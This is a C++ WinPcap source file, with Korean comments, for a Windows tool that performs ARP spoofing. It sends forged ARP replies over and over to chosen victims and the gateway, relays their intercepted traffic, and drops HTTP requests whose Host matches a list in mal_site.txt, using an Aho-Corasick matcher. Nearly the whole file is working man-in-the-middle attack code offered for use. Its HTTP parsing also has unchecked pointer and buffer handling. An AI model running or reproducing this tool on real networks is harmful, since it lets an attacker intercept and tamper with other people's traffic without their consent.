#include <iostream>
#include <string.h>
#include <winsock2.h>
#include <iptypes.h>
#include <iphlpapi.h>
#include <stdlib.h>
#include <locale.h>
#include <stdlib.h>
#include "pcap.h"
#include "header.h"
#pragma comment(lib, "Ws2_32.lib")
#pragma comment (lib, "wpcap.lib")
#pragma comment(lib, "iphlpapi")
using namespace std;

int Search(string target);

unsigned char BROADCAST[MAC_LEN] = { 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF };
bool flag;
int LIST_NUM = 0; // 실제 패턴 종류
long long int out[MAX_LENGTH]; //패턴의 끝을 bit or 연산으로 설정
int failure[MAX_LENGTH]; //실패시 돌아갈 경로
int line[MAX_LENGTH][WORD_NUM]; //연결된 경로
string pattern[PATTERN_BUF];
bool builded = FALSE;

typedef struct FILTER
{
	unsigned char cmp_ip[IP_LEN];
	unsigned char cmp_mac[MAC_LEN];
	unsigned char request_mac[MAC_LEN];
}FILTER;
typedef struct ETH {
	unsigned char	h_dest[MAC_LEN];	/* destination eth addr	*/
	unsigned char	h_source[MAC_LEN];	/* source ether addr	*/
	unsigned short	h_proto;		/* packet type ID field	*/
}ETH;
typedef struct ARP {
	u_int16_t htype;    /* Hardware Type           */
	u_int16_t ptype;    /* Protocol Type           */
	u_char hlen;        /* Hardware Address Length */
	u_char plen;        /* Protocol Address Length */
	u_int16_t oper;     /* Operation Code          */
	u_char sha[MAC_LEN];      /* Sender hardware address */
	u_char spa[IP_LEN];      /* Sender IP address       */
	u_char tha[MAC_LEN];      /* Target hardware address */
	u_char tpa[IP_LEN];      /* Target IP address       */
}ARP;
typedef struct DATA
{
	ETH eth;
	ARP arp;
}DATA;
typedef struct RELAY
{
	unsigned char victim_mac[MAC_LEN];
	unsigned char victim_ip[IP_LEN];
	bool ON_OFF;
}RELAY;
typedef struct PARA
{
	unsigned char send_mac[MAC_LEN] = {};
	unsigned char send_ip[IP_LEN] = {};
	unsigned char gw_mac[MAC_LEN] = {};
	unsigned char gw_ip[IP_LEN] = {};
	pcap_t* dev_handle;
}PARA;

FILTER filter = {};
RELAY relay[CHANNEL_SIZE] = {};
PARA para = {};

class control
{
private:
	bool arp_on;
	pcap_t* dev_handle;
	DATA data; //poisoning recv
	DATA data2; //poisoning gw
	unsigned char  send_mac[MAC_LEN], send_ip[IP_LEN], recv_mac[MAC_LEN], recv_ip[IP_LEN], gw_ip[IP_LEN], gw_mac[MAC_LEN];
public:
	control()
	{
		arp_on = FALSE;
		data.eth.h_proto = ARP_PROTO_REVERSED;
		data.arp.hlen = MAC_LEN;
		data.arp.plen = PRO_LEN;
		data.arp.htype = ETHERNET_REVERSED;
		data.arp.ptype = IP4_REVERSED;

		data2.eth.h_proto = ARP_PROTO_REVERSED;
		data2.arp.hlen = MAC_LEN;
		data2.arp.plen = PRO_LEN;
		data2.arp.htype = ETHERNET_REVERSED;
		data2.arp.ptype = IP4_REVERSED;
		memset(send_mac, NULL, MAC_LEN);
		memset(send_ip, NULL, IP_LEN);
		memset(send_mac, NULL, MAC_LEN);
		memset(recv_ip, NULL, IP_LEN);
		memset(gw_ip, NULL, IP_LEN);
		memset(gw_mac, NULL, MAC_LEN);
	}
	void input_recv_ip()
	{
		unsigned char input_recv_ip[BUF_SIZE], recv_ip[IP_LEN];
		printf("receiver IP : ");
		scanf_s("%s", input_recv_ip, BUF_SIZE);
		my_ntoa(input_recv_ip, recv_ip, IP_LEN);
		mstrncpy(this->recv_ip, recv_ip, IP_LEN);
		mstrncpy(data.arp.tpa, recv_ip, IP_LEN);
		while (getchar() != '\n');
	}
	void get_mac_by_ip_recv()
	{
		mstrncpy(filter.cmp_mac, send_mac, MAC_LEN);
		mstrncpy(filter.cmp_ip, recv_ip, IP_LEN);
		mstrncpy(data.eth.h_source, send_mac, MAC_LEN);
		mstrncpy(data.eth.h_dest, BROADCAST, MAC_LEN);
		data.arp.oper = REQUEST_REVERSED;
		mstrncpy(data.arp.spa, send_ip, IP_LEN);
		mstrncpy(data.arp.sha, send_mac, MAC_LEN);
		memset(data.arp.tha, 0x00, MAC_LEN);
		Sleep(0);
		pcap_sendpacket(dev_handle, (const u_char*)&data, sizeof DATA);
		flag = FALSE;
		while (flag == FALSE);
		mstrncpy(recv_mac, filter.request_mac, MAC_LEN);
	}
	void get_mac_by_ip_gw()
	{
		mstrncpy(filter.cmp_mac, send_mac, MAC_LEN);
		mstrncpy(filter.cmp_ip, gw_ip, IP_LEN);
		mstrncpy(data2.eth.h_source, send_mac, MAC_LEN);
		mstrncpy(data2.eth.h_dest, BROADCAST, MAC_LEN);
		data2.arp.oper = REQUEST_REVERSED;
		mstrncpy(data2.arp.spa, send_ip, IP_LEN);
		mstrncpy(data2.arp.sha, send_mac, MAC_LEN);
		memset(data2.arp.tha, 0x00, MAC_LEN);
		mstrncpy(data2.arp.tpa, gw_ip, IP_LEN);
		Sleep(0);
		pcap_sendpacket(dev_handle, (const u_char*)&data2, sizeof DATA);
		flag = FALSE;
		while (flag == FALSE);
		mstrncpy(gw_mac, filter.request_mac, MAC_LEN);

		mstrncpy(para.gw_mac, gw_mac, MAC_LEN);
		mstrncpy(para.send_ip, send_ip, IP_LEN);
		mstrncpy(para.send_mac, send_mac, MAC_LEN);
		mstrncpy(para.gw_ip, gw_ip, IP_LEN);
	}
	void send(int channel)
	{
		mstrncpy(data.eth.h_source, send_mac, MAC_LEN);
		mstrncpy(data.eth.h_dest, recv_mac, MAC_LEN);
		mstrncpy(data.arp.tha, recv_mac, MAC_LEN);
		mstrncpy(data.arp.tpa, recv_ip, IP_LEN);
		mstrncpy(data.arp.sha, send_mac, MAC_LEN);
		mstrncpy(data.arp.spa, gw_ip, IP_LEN);
		data.arp.oper = REPLY_REVERSED;
		
		mstrncpy(data2.eth.h_source, send_mac, MAC_LEN);
		mstrncpy(data2.eth.h_dest, gw_mac, MAC_LEN);
		mstrncpy(data2.arp.tha, gw_mac, MAC_LEN);
		mstrncpy(data2.arp.tpa, gw_ip, IP_LEN);
		mstrncpy(data2.arp.sha, send_mac, MAC_LEN);
		mstrncpy(data2.arp.spa, recv_ip, IP_LEN);
		data2.arp.oper = REPLY_REVERSED;

		mstrncpy(relay[channel].victim_mac, recv_mac, MAC_LEN);
		mstrncpy(relay[channel].victim_ip, recv_ip, IP_LEN);
	}
	void loop()
	{
		if (arp_on == TRUE)
		{
			pcap_sendpacket(dev_handle, (const u_char*)&data, sizeof DATA);
			pcap_sendpacket(dev_handle, (const u_char*)&data2, sizeof DATA);
		}
		else
			return;
	}
	void showinfo()
	{
		for (int i = 0; i < IP_LEN; i++)
		{
			if (i != IP_LEN - 1)
				printf("%d.", recv_ip[i]);
			else
				printf("%d ", recv_ip[i]);
		}
		printf(" < --- >  ");
		for (int i = 0; i < IP_LEN; i++)
		{
			if (i != IP_LEN - 1)
				printf("%d.", send_ip[i]);
			else
				printf("%d ", send_ip[i]);
		}
		printf(" < --- >  ");
		for (int i = 0; i < IP_LEN; i++)
		{
			if (i != IP_LEN - 1)
				printf("%d.", gw_ip[i]);
			else
				printf("%d", gw_ip[i]);
		}
		if (arp_on)
			printf("   ON\n");
		else
			printf("   OFF\n");
	}
	void set_dev_handle(pcap_t* dev_handle) { this->dev_handle = dev_handle; }
	void connect(int channel)
	{
		relay[channel].ON_OFF = TRUE;
		arp_on = TRUE;
	}
	void disconnect(int channel)
	{
		relay[channel].ON_OFF = FALSE;
		arp_on = FALSE;
	}
	unsigned char* get_send_ip() { return send_ip; }
	unsigned char* get_send_mac() { return send_mac; }
	unsigned char* get_gw_ip() { return gw_ip; }
};
class controller
{
private:
	unsigned char send_mac[MAC_LEN], send_ip[IP_LEN], gw_ip[IP_LEN], gw_mac[MAC_LEN];
	pcap_t* dev_handle;
	control pos[CHANNEL_SIZE];
public:
	controller()
	{
		pcap_if_t *dev_list;
		pcap_if_t *dev_tmp;
		pcap_t *dev_handle;
		int input, dev_list_len;
		pcap_findalldevs(&dev_list, (char*)stderr);
		dev_tmp = dev_list;
		for (dev_list_len = 0; dev_tmp != NULL; dev_list_len++)
		{
			printf("%d - %-32s (%s)\n", dev_list_len + 1, dev_tmp->description, dev_tmp->name);
			dev_tmp = dev_tmp->next;
		}
		do
		{
			printf("Select Device : ");
			scanf("%d", &input);
			while (getchar() != '\n');
		} while (input < 1 || input >dev_list_len);

		dev_tmp = dev_list;
		for (int i = 0; i < input - 1; i++)
			dev_tmp = dev_tmp->next;

		dev_handle = pcap_open_live(dev_tmp->name, 65536, 1, 100, (char*)stderr);
		this->dev_handle = dev_handle;
		for (int i = 0; i < CHANNEL_SIZE; i++)
			pos[i].set_dev_handle(dev_handle);
	}
	void set_basic()
	{
		PIP_ADAPTER_INFO temp;
		PIP_ADAPTER_INFO Info;
		DWORD size;
		int result, input, i = 0;
		unsigned char buf[BUF_SIZE] = {};

		ZeroMemory(&Info, sizeof(PIP_ADAPTER_INFO));
		size = sizeof(PIP_ADAPTER_INFO);

		result = GetAdaptersInfo(Info, &size);

		if (result == ERROR_BUFFER_OVERFLOW) 
		{
			Info = (PIP_ADAPTER_INFO)malloc(size);

			GetAdaptersInfo(Info, &size);
		}

		printf("\n%-4s%-16s     %-16s%-16s\n", "No,", "MAC", "IP", "GateWay");
		for (temp = Info; temp != NULL; i++, temp = temp->Next)
		{
			printf("%d.  %02x-%02x-%02x-%02x-%02x-%02x    %-16s%-16s\n",
				i + 1,
				temp->Address[0],
				temp->Address[1],
				temp->Address[2],
				temp->Address[3],
				temp->Address[4],
				temp->Address[5],
				temp->IpAddressList.IpAddress.String,
				temp->GatewayList.IpAddress.String);
		}
		do
		{
			printf("Select Addresses : ");
			scanf("%d", &input);
			while (getchar() != '\n');
		} while (input<1 || input>i);
		for (int i = 0; i < input - 1; i++)
			Info = Info->Next;

		sprintf((char*)buf, "%s", Info->IpAddressList.IpAddress.String);
		my_ntoa(buf, send_ip, IP_LEN);
		for (int i = 0; i < CHANNEL_SIZE; i++)
			mstrncpy(pos[i].get_send_ip(), send_ip, IP_LEN);
		sprintf((char*)buf, "%02x:%02x:%02x:%02x:%02x:%02x",
			Info->Address[0],
			Info->Address[1],
			Info->Address[2],
			Info->Address[3],
			Info->Address[4],
			Info->Address[5]);
		my_ntoa(buf, send_mac, MAC_LEN);
		for (int i = 0; i < CHANNEL_SIZE; i++)
			mstrncpy(pos[i].get_send_mac(), send_mac, MAC_LEN);
		sprintf((char*)buf, "%s", Info->GatewayList.IpAddress.String);
		my_ntoa(buf, gw_ip, IP_LEN);
		for (int i = 0; i < CHANNEL_SIZE; i++)
			mstrncpy(pos[i].get_gw_ip(), gw_ip, IP_LEN);
	}
	void start_arp(int channel)
	{
		pos[channel].input_recv_ip();
		pos[channel].get_mac_by_ip_recv();
		pos[channel].get_mac_by_ip_gw();
	}
	void send(int channel)
	{
		pos[channel].send(channel);
	}
	void looping()
	{
		para.dev_handle = dev_handle;
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)start_capture, NULL, 0, NULL); //전체 패킷 핸들러
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)handler, (LPVOID)pos, 0, NULL); //주기적 감염
	}
	void showinfo(int channel)
	{
		pos[channel].showinfo();
	}
	void disconnect(int channel) { pos[channel].disconnect(channel); }
	void connect(int channel) { pos[channel].connect(channel); }
};
class STACK
{
private:
	int SP;
	int data[MAX_LENGTH];
public:
	STACK()
		:SP(0)
	{
		memset(data, 0, MAX_LENGTH);
	}
	void push(int n)
	{
		data[SP++] = n;
	}
	int pop()
	{
		return data[--SP];
	}
	int front()
	{
		return data[SP - 1];
	}
	int size()
	{
		return SP;
	}
};

int main()
{
	int channel, choice;
	controller my_controller;
	my_controller.set_basic();
	my_controller.looping();
	system("cls");
	while (1)
	{
		printf("\n1. New Session(with connect)\n");
		printf("2. Connect Session\n");
		printf("3. Disconnect Session\n");
		printf("4. Info Session\n");
		printf("5. Clear Console\n");
		printf("Select : ");
		scanf("%d", &choice);
		if (choice < 1 || choice > 5)
		{
			printf("out of index\n\n");
			while (getchar() != '\n');
			continue;
		}
		if (choice == 5)
		{
			system("cls");
			continue;
		}
		else if (choice == 4)
			printf("Session(1~%d) (0 is all) : ", CHANNEL_SIZE);
		else
			printf("Session(1~%d) : ", CHANNEL_SIZE);
		scanf("%d", &channel);
		channel--;
		if ((channel < 0 || channel >= CHANNEL_SIZE) && !(channel == -1 && choice == 4))
		{
			printf("out of index\n\n");
			while (getchar() != '\n');
			continue;
		}
		switch (choice)
		{
		case 1:
			my_controller.start_arp(channel);
			my_controller.send(channel);
			my_controller.connect(channel);
			break;
		case 2:
			my_controller.connect(channel);
			break;
		case 3:
			my_controller.disconnect(channel);
			break;
		case 4:
			if (channel == -1)
				for (int i = 0; i < CHANNEL_SIZE; i++)
					my_controller.showinfo(i);
			else
				my_controller.showinfo(channel);
			break;
		default:
			break;
		}
	}
	return 0;
}
void packet_handler(u_char* u_para, const struct pcap_pkthdr *header, const u_char *packet)
{
	int type = 0;
	type += packet[PROTO0_OFFSET] * 0x100;
	type += packet[PROTO1_OFFSET];
	if (type == ARP_PROTO && flag == FALSE) //정상 arp에대한 응답일때
	{
		if (data_cmp(&packet[ARP_SIP_OFFSET], filter.cmp_ip, IP_LEN) == 1)
			return;
		if (data_cmp(&packet[ARP_DMAC_OFFSET], filter.cmp_mac, MAC_LEN) == 1)
			return;
		mstrncpy(filter.request_mac, (unsigned char*)&packet[ARP_SMAC_OFFSET], MAC_LEN);
		Sleep(1); //delay for write memory
		flag = TRUE;
		return;
	}
	else //relay
	{
		if (type != IP4)
			return;
		for (int i = 0; i < CHANNEL_SIZE; i++)
		{
			if (relay[i].ON_OFF == FALSE)
				continue;
			if (data_cmp(&packet[ETH_LENGTH + IPV4_DIP_OFFSET], para.send_ip,IP_LEN) == 1 && data_cmp(&packet[ETH_SMAC_OFFSET], para.send_mac, MAC_LEN) == 1) //목적지ip가 나와 다른경우
			{
				unsigned char* data = (unsigned char*)malloc(header->len);
				memcpy(data, packet, header->len);
				mstrncpy(&data[ETH_SMAC_OFFSET], para.send_mac, MAC_LEN);
				if (data_cmp(&packet[ETH_LENGTH + IPV4_SIP_OFFSET], relay[i].victim_ip, IP_LEN) == 0) //감염자가 보낸 패킷일경우
				{

					unsigned char ipv4_proto = packet[ETH_LENGTH + IPV4_PROTO_OFFSET];
					if (ipv4_proto != TCP)
						goto SKIP;

					unsigned short ipv4_header_size = packet[ETH_LENGTH + IPV4_LENGTH_OFFSET];
					ipv4_header_size &= 0x0F;
					ipv4_header_size *= 4;

					unsigned short port = packet[ETH_LENGTH + ipv4_header_size + TCP_DPORT_OFFSET1] * 0x100 + packet[ETH_LENGTH + ipv4_header_size + TCP_DPORT_OFFSET2];
					if (!(port == 80 || port == 8080))
						goto SKIP;

					unsigned short tcp_header_size = packet[ETH_LENGTH + ipv4_header_size + TCP_LENGTH_OFFSET];
					tcp_header_size &=0xF0;
					tcp_header_size /= 0x10;
					tcp_header_size *= 4;
					
					unsigned short http = ETH_LENGTH + ipv4_header_size + tcp_header_size;
					if (data_cmp((unsigned char*)"GET", &packet[ETH_LENGTH + ipv4_header_size + tcp_header_size], 3)) //3 is "GET" length
						goto SKIP;


					char* url_start = strstr((char*)&packet[http], "Host: ");
					char* url_last = strstr(url_start, "\r\n");
					char url[256];
					int url_len =  url_last - url_start;
					strncpy(url,url_start+5,url_len - 5);//5 is "GET /" length
					url[url_len-5] = NULL;

					if (is_bad_url(url))
						goto DROP;

					SKIP:
					mstrncpy(&data[ETH_DMAC_OFFSET], para.gw_mac, MAC_LEN);
					pcap_sendpacket(para.dev_handle, data, header->len);
				}
				else if(data_cmp(&packet[ETH_LENGTH + IPV4_DIP_OFFSET],relay[i].victim_ip,IP_LEN) == 0) //다른곳에서 응답할 패킷일경우
				{
					mstrncpy(&data[ETH_DMAC_OFFSET], relay[i].victim_mac, MAC_LEN);
					pcap_sendpacket(para.dev_handle, data, header->len);
				}
				DROP:
				free(data);
			}
		}
	}
}
void mstrncpy(unsigned char* target, unsigned char* source, int num)
{
	memcpy(target, source, num);
}
void my_ntoa(unsigned char* source, unsigned char* target, int len)
{
	int index[MAC_LEN], count = 0;
	if (len == IP_LEN)
	{
		unsigned char* temp = (unsigned char*)malloc(strlen((char*)source) + 1);
		mstrncpy(temp, source, strlen((char*)source) + 1);
		for (int i = 0; count < IP_LEN - 1; i++)
		{
			if (temp[i] == '.')
			{
				index[count++] = i;
				temp[i] = NULL;
			}
		}
		for (int i = 0; i < len; i++)
		{
			if (i == 0)
				target[i] = atoi((char*)temp);
			else
				target[i] = atoi((char*)&temp[index[i - 1] + 1]);
		}
		free(temp);
	}
	else if (len == MAC_LEN)
	{
		for (int i = 0; i < MAC_LEN; i++)
		{
			target[i] = 0;
			if ('0' <= source[i * 3] && source[i * 3] <= '9')
				target[i] += (source[i * 3] - '0') * 0x10;
			else if ('a' <= source[i * 3] && source[i * 3] <= 'f')
				target[i] += (source[i * 3] - 'a' + 10) * 0x10;
			else if ('A' <= source[i * 3] && source[i * 3] <= 'F')
				target[i] += (source[i * 3] - 'A' + 10) * 0x10;
			if ('0' <= source[i * 3 + 1] && source[i * 3 + 1] <= '9')
				target[i] += (source[i * 3 + 1] - 0x30);
			else if ('a' <= source[i * 3 + 1] && source[i * 3 + 1] <= 'f')
				target[i] += (source[i * 3 + 1] - 'a' + 10);
			else if ('A' <= source[i * 3 + 1] && source[i * 3 + 1] <= 'F')
				target[i] += (source[i * 3 + 1] - 'A' + 10);
		}
	}
}
void start_capture()
{
	pcap_loop(para.dev_handle, 0, packet_handler, NULL);
}
void handler(control* pos)
{
	while (1)
	{
		for (int i = 0; i < CHANNEL_SIZE; i++)
			pos[i].loop();
		Sleep(TIMEOUT);
	}
}
int data_cmp(const unsigned char* source1, const unsigned char* source2, int len)
{
	for (int i = 0; i < len; i++)
		if (source1[i] != source2[i])
			return 1;
	return 0;
}
void read_pattern(char* src)
{
	int count = 0;
	FILE* fptr = fopen(src, "r");
	if (fptr == NULL)
	{
		printf("file open error\n");
		return;
	}
	for (int i = 0; !feof(fptr); i++)
	{
		char url[MAX_LENGTH];
		fscanf(fptr, "%s", url);
		pattern[i] = url;
		count++;
	}
	LIST_NUM = count;
	return;
}
int build()
{
	STACK stack;
	memset(out, 0, sizeof out);
	memset(line, -1, sizeof line);
	int states = 1;

	for (int i = 0; i < LIST_NUM; i++) //패턴 하나를 가져와서
	{
		const string &word = pattern[i]; //패턴 하나를 가리키는 참조자 선언
		int currentState = 0; //현재 노드의 깊이

		for (int j = 0; j < word.size(); ++j) //패턴의 길이만큼 돌면서 라인을 그림
		{
			int ch = word[j];
			if (line[currentState][ch] == -1) //없는 노드일경우
				line[currentState][ch] = states++; //노드를 추가

			currentState = line[currentState][ch]; //현재 노드를 추가한 노드로 옮김
		}

		out[currentState] |= (1LL << i); // 현재의 노드 깊이의 out 리스트에 노드 2**단어인덱스 를 or 연산함
	}

	for (int ch = 0; ch < WORD_NUM; ++ch) //root 에서 아무 노드도 매칭되지 않을경우 다시 자기 자신으로 돌아감
		if (line[0][ch] == -1)
			line[0][ch] = 0;

	memset(failure, -1, sizeof failure);

	for (int ch = 0; ch < WORD_NUM; ++ch)
	{
		if (line[0][ch] != 0)
		{
			failure[line[0][ch]] = 0;  //root에서 연결되는 노드들의 실패 경로는 root임
			stack.push(line[0][ch]); //다음 노드를 연결하기 위해 쓰이는 스택
		}
	}
	while (stack.size())
	{
		int state = stack.pop();
		for (int ch = 0; ch < WORD_NUM; ++ch)
		{
			if (line[state][ch] != -1) //연결되있는 노드일경우
			{
				int fail = failure[state];
				while (line[fail][ch] == -1) //끝이 막혔다면
					fail = failure[fail]; //해당 노드의 failure line을 따라감

				fail = line[fail][ch]; //failure line을 저장함
				failure[line[state][ch]] = fail; //끝이 아니라면 해당 노드를 state 의 failure line 으로 설정함

				out[line[state][ch]] |= out[fail];

				stack.push(line[state][ch]); //노드를 스택에 집어넣음
			}
		}
	}
	return states;
}
int linking(int state, char next)
{
	int ch = next;
	while (line[state][ch] == -1) //만약 노드의 끝이라면
		state = failure[state]; //계속 failure line 을 따라감

	return line[state][ch];
}
int Search(string target)
{
	if (builded == FALSE) //처음 실행되는거라면
	{
		read_pattern("mal_site.txt"); //url 리스트를 읽고
		build(); //패턴을 생성함
		builded = TRUE;
	}
	int currentState = 0;
	for (int i = 0; i < target.size(); ++i)
	{
		currentState = linking(currentState, target[i]); //현재 노드에서 다음 노드의 데이터를 가지고 다음 노드를 찾음
		if (out[currentState] == 0) //패턴과 일치하지 않는 경우(혹은 아직 발견하지 못한경우)
			continue;

		for (int j = 0; j < LIST_NUM; ++j)
		{
			if (out[currentState] & (1LL << j))
			{
				return 1;
			}
		}
	}
	return 0;
}
int is_bad_url(char* url)
{
	string temp = url;
	return Search(url);
}